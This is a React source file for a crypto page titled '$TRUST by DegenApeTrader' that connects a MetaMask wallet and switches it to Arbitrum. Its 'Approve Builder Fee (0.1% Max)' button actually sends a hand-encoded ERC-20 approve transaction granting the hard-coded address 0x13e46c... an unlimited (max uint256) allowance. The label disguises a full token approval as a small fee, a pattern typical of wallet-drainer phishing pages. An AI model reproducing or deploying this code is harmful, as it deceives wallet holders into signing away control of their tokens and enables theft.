const { useState, useEffect } = React;

function BuilderFeeApproval() {
  const [walletStatus, setWalletStatus] = useState('Not Connected');
  const [walletAddress, setWalletAddress] = useState('');
  const [responseMessage, setResponseMessage] = useState('');
  const [responseType, setResponseType] = useState('');
  const [chainId, setChainId] = useState(null);
  const [isApproving, setIsApproving] = useState(false);

  useEffect(() => {
    const checkConnection = async () => {
      if (!window.ethereum) return;
      
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length) {
          setWalletAddress(accounts[0]);
          setWalletStatus('Connected');
          const chain = await window.ethereum.request({ method: 'eth_chainId' });
          setChainId(chain);
        }
      } catch (err) {
        console.error(err);
      }
    };

    checkConnection();
    
    if (window.ethereum) {
      const handleChainChanged = (chain) => {
        setChainId(chain);
        window.location.reload();
      };
      
      const handleAccountsChanged = (accounts) => {
        if (accounts.length === 0) {
          setWalletStatus('Not Connected');
          setWalletAddress('');
        } else {
          setWalletAddress(accounts[0]);
          setWalletStatus('Connected');
        }
      };

      window.ethereum.on('chainChanged', handleChainChanged);
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      
      return () => {
        if (window.ethereum.removeListener) {
          window.ethereum.removeListener('chainChanged', handleChainChanged);
          window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        }
      };
    }
  }, []);

  const handleChainSwitch = async () => {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0xa4b1' }]
      });
    } catch (error) {
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0xa4b1',
              chainName: 'Arbitrum One',
              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://arb1.arbitrum.io/rpc'],
              blockExplorerUrls: ['https://arbiscan.io']
            }]
          });
        } catch (addError) {
          setResponseMessage('Failed to add Arbitrum network');
          setResponseType('error');
        }
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      setWalletStatus('MetaMask Not Detected');
      return;
    }

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts"
      });

      if (accounts.length > 0) {
        setWalletStatus('Connected');
        setWalletAddress(accounts[0]);
        const chain = await window.ethereum.request({ method: 'eth_chainId' });
        setChainId(chain);
      }
    } catch (error) {
      setWalletStatus('Connection Failed');
    }
  };

  const approveBuilderFee = async () => {
    if (!window.ethereum || !walletAddress) return;
    
    try {
      setIsApproving(true);
      setResponseMessage('Initiating approval...');
      setResponseType('info');

      const approveData = '0x095ea7b3000000000000000000000000' + 
                         '13e46ccd194ca86212236543d2e7376b00bafa42' +
                         'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

      const transactionParameters = {
        from: walletAddress,
        to: '0x13e46cCd194ca86212236543d2e7376b00bafa42',
        data: approveData,
        chainId: '0xa4b1'
      };

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [transactionParameters]
      });

      if (txHash) {
        setResponseMessage('Approval transaction submitted! Hash: ' + txHash.slice(0, 10) + '...');
        setResponseType('success');
      }

    } catch (error) {
      if (error.code === 4001) {
        setResponseMessage('Transaction rejected by user');
      } else {
        setResponseMessage('Approval failed: ' + error.message);
      }
      setResponseType('error');
    } finally {
      setIsApproving(false);
    }
  };

  return React.createElement("div", { className: "container" },
    React.createElement("div", { className: "card" },
      React.createElement("h1", { className: "title" }, "$TRUST"),
      React.createElement("p", { className: "subtitle" }, "by DegenApeTrader (DAT)"),
      
      chainId !== '0xa4b1' && walletStatus === 'Connected' &&
        React.createElement("div", { className: "message error" },
          React.createElement("p", null, "Please switch to Arbitrum"),
          React.createElement("button", {
            onClick: handleChainSwitch,
            className: "switch-network"
          }, "Switch Network")
        ),

      React.createElement("div", { className: "status" },
        React.createElement("span", {
          className: `status-dot ${walletStatus === 'Connected' ? 'connected' : 'disconnected'}`
        }),
        walletStatus
      ),

      walletAddress &&
        React.createElement("p", { className: "subtitle" },
          `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
        ),

      walletStatus !== 'Connected' &&
        React.createElement("button", {
          onClick: connectWallet,
          className: "button button-primary"
        }, "Connect Wallet"),

      React.createElement("button", {
        onClick: approveBuilderFee,
        disabled: walletStatus !== 'Connected' || chainId !== '0xa4b1' || isApproving,
        className: "button button-secondary"
      }, isApproving ? "Approving..." : "Approve Builder Fee (0.1% Max)"),

      responseMessage &&
        React.createElement("div", {
          className: `message ${responseType}`
        }, responseMessage)
    )
  );
}

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(React.createElement(BuilderFeeApproval));
